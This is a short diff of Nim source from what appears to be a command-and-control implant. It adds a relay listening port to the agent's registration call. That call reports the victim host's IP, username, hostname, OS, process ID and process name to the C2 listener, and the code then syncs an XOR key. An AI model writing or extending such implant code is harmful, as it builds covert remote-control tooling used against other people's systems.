@@ -700,8 +700,11 @@ proc httpHandler() {.async.} =
             else:
                 "STANDARD"      # Standard agent - direct C2 connection
             
+            # Get listening port if relay server is configured
+            let listeningPort = relay_launcher.getRelayServerPort()
+            
             webClientListener.postRegisterRequest(listener, localIP, username, hostname, 
-                                                 osInfo, pid, processName, false, relayRole)
+                                                 osInfo, pid, processName, false, relayRole, listeningPort)
             
             # CRITICAL FIX: Sync relay client encryption key from HTTP listener after registration
             if listener.UNIQUE_XOR_KEY != "":
